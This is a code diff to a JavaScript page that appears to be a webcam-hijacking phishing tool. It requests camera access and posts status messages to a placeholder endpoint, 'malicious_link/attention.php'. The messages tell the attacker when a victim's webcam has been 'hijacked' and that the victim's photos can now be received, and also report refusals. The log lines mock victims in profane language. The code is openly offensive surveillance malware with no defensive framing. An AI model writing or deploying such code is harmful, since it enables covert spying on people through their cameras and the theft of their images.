@@ -57,18 +57,20 @@
           errorMsgElement.innerHTML = e.toString();
           console.log(`navigator.getUserMedia error:${e.toString()}`);
           if (e.toString().includes("NotFoundError")){
-              console.log("Hmm, Internal or External Webcam can not be found in victims device!");
+              console.log("Hmm, ebi like say dis device no get any internal or external webcam!");
         await wait4me(5000);
               var xhttp = new XMLHttpRequest();
-              xhttp.open("post", "malicious_link/attention.php?denied1=Hmm,_internal_or_external_camera_can_not_be_found_in_victims_device!");//
+              xhttp.open("post", "malicious_link/attention.php?denied1=Internal_or_external_webcam_can_not_be_found_in_victims_device!");//
               xhttp.send();
               console.log(xhttp);
           } else {
-              console.log("Hmm,\nWe fucking well need to fucking access ur fucking camera, men!");
-              alert("Allow Camera Access for video calls on plat_name!");
-              window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623";
-              alert("Access to Camera Successfully Granted");
-              console.log("BOOM!, Game Over...");
+            console.log("We fucking well need to fucking access ur fucking webcam, men!");
+            await wait4me(5000);
+            var xhttp = new XMLHttpRequest();
+            var msg = "Victims_dispermit_us_in_accessing_their_webcam, Means_that_u_will_not_be_able_to_receive_their_active_photos.!";
+            xhttp.open("post", `malicious_link/attention.php?denied1=${msg}`);//
+            xhttp.send();
+            console.log(xhttp);
           }
         }
       }
@@ -77,10 +79,10 @@
       async function handleSuccess(stream) {
         window.stream = stream;
         video.srcObject = stream;
-        console.log("Hmm, we_successfully_hacked_victims_internal_or_their_external_camera!");
+        console.log("Hahaha, we don hijack this device webcam!");
         await wait4me(5000);
               var xhttp = new XMLHttpRequest();
-              xhttp.open("post", "malicious_link/attention.php?granted1=Wo-ho!,_we_successfully_hacked_into_victims_camera!, Now_u_can_be_able_to_received_victims_pictures.");//
+              xhttp.open("post", "malicious_link/attention.php?granted1=We_successfully_hijack_victims_webcam!, U_can_now_be_able_to_received_victims_active_photos.");//
               xhttp.send();
               console.log(xhttp);
       
